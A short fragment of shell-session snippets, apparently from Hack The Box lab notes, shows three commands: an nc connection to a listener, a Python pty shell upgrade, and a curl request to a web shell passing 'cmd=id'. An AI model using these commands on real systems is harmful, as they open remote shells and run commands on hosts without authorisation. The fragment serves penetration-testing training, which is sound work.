...
```shell-session
xF1NN@htb[/htb]$ nc 10.10.10.1 1234
...
```shell-session
xF1NN@htb[/htb]$ python -c 'import pty; pty.spawn("/bin/bash")'
```
...
```shell-session
xF1NN@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id
